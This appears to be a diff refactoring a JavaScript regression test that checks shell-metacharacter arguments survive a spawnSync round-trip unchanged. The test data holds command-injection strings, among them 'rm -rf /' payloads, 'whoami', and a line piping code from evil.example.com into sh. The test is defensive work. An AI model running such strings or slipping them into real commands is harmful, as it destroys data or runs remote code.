@@ -50,66 +50,23 @@ function roundtrip(payload) {
   return JSON.parse(result.stdout);
 }
 
-// Each entry is one regression case. Adding a new metacharacter or
-// payload shape that must round-trip means appending one row here, not
-// duplicating a four-line `it()` block.
-const LITERAL_PRESERVATION_CASES = [
-  {
-    label: "$() command substitution",
-    payload: ["--filter-pattern", "$(rm -rf /)"],
-  },
-  {
-    label: "backtick command substitution",
-    payload: ["--filter-pattern", "`id`"],
-  },
-  {
-    label: "single quotes",
-    payload: ["--parameters", "'; rm -rf /; echo '"],
-  },
-  {
-    label: "double quotes",
-    payload: ["--filter-pattern", '"; whoami; echo "'],
-  },
-  {
-    label: "semicolons",
-    payload: ["--filter-pattern", "foo; rm -rf /"],
-  },
-  {
-    label: "ampersands and pipes",
-    payload: ["--filter-pattern", "foo && curl evil.example.com | sh"],
-  },
-  {
-    label: "spaces inside a single argv element",
-    payload: ["--key", "this is one element"],
-  },
-  {
-    label: "newlines inside an argv element",
-    payload: ["--filter-pattern", "line one\nline two"],
-  },
-  {
-    label: "S3 keys containing shell metacharacters",
-    payload: [
-      "s3api",
-      "head-object",
-      "--bucket",
-      "evil$(id)bucket",
-      "--key",
-      "path/to/`whoami`/file.txt",
-    ],
-  },
-  {
-    label: "CloudWatch filter patterns containing every metacharacter",
-    payload: [
-      "logs",
-      "filter-log-events",
-      "--filter-pattern",
-      "$()`'\";|&\nsh -c 'whoami'",
-    ],
-  },
-];
+// One entry per metacharacter/payload shape that must round-trip.
+// Map keys are the test label; values are the argv payload.
+const LITERAL_PRESERVATION_CASES = new Map([
+  ["$() command substitution", ["--filter-pattern", "$(rm -rf /)"]],
+  ["backtick command substitution", ["--filter-pattern", "`id`"]],
+  ["single quotes", ["--parameters", "'; rm -rf /; echo '"]],
+  ["double quotes", ["--filter-pattern", '"; whoami; echo "']],
+  ["semicolons", ["--filter-pattern", "foo; rm -rf /"]],
+  ["ampersands and pipes", ["--filter-pattern", "foo && curl evil.example.com | sh"]],
+  ["spaces inside a single argv element", ["--key", "this is one element"]],
+  ["newlines inside an argv element", ["--filter-pattern", "line one\nline two"]],
+  ["S3 keys with metacharacters", ["s3api", "head-object", "--bucket", "evil$(id)bucket", "--key", "path/to/`whoami`/file.txt"]],
+  ["CloudWatch filter patterns with every metacharacter", ["logs", "filter-log-events", "--filter-pattern", "$()`'\";|&\nsh -c 'whoami'"]],
+]);
 
 describe("spawnSync argv round-trip (issue #763)", () => {
-  for (const { label, payload } of LITERAL_PRESERVATION_CASES) {
+  for (const [label, payload] of LITERAL_PRESERVATION_CASES) {
     it(`preserves ${label} literally`, () => {
       assert.deepEqual(roundtrip(payload), payload);
     });
